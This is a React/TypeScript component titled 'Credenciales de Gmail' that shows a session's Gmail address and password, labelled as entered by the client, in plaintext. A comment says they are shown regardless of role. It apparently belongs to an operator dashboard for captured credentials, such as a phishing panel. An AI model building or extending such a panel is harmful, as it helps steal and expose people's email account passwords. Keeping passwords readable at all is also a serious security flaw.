import React from 'react';
import { Session } from '@shared/schema';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { EyeIcon, Lock, Mail } from 'lucide-react';

interface GmailCredentialsBoxProps {
  session: Session | null;
  userRole?: 'admin' | 'user';
}

export const GmailCredentialsBox: React.FC<GmailCredentialsBoxProps> = ({ session, userRole = 'user' }) => {
  // Los correos y contraseñas siempre se muestran independientemente del rol
  const isAdmin = userRole === 'admin';
  if (!session || (!session.correo && !session.contrasena)) {
    return (
      <Card className="bg-[#1e1e1e] border border-gray-600 text-gray-300">
        <CardHeader className="pb-2">
          <CardTitle className="text-lg flex items-center">
            <Mail className="mr-2 h-5 w-5 text-blue-500" />
            Credenciales de Gmail
          </CardTitle>
          <CardDescription>
            No hay datos de Gmail disponibles
          </CardDescription>
        </CardHeader>
      </Card>
    );
  }

  return (
    <Card className="bg-[#1e1e1e] border border-gray-600 text-gray-300">
      <CardHeader className="pb-2">
        <CardTitle className="text-lg flex items-center">
          <Mail className="mr-2 h-5 w-5 text-blue-500" />
          Credenciales de Gmail
        </CardTitle>
        <CardDescription>
          Datos ingresados por el cliente
        </CardDescription>
      </CardHeader>
      <CardContent className="pb-2">
        <div className="grid gap-2">
          {session.correo && (
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <Mail className="mr-2 h-4 w-4 text-gray-400" />
                <span className="text-sm font-medium">Correo:</span>
              </div>
              <span className="bg-[#2c2c2c] px-2 py-1 rounded text-gray-100">{session.correo}</span>
            </div>
          )}
          
          {session.contrasena && (
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <Lock className="mr-2 h-4 w-4 text-gray-400" />
                <span className="text-sm font-medium">Contraseña:</span>
              </div>
              <span className="bg-[#2c2c2c] px-2 py-1 rounded text-gray-100">{session.contrasena}</span>
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  );
};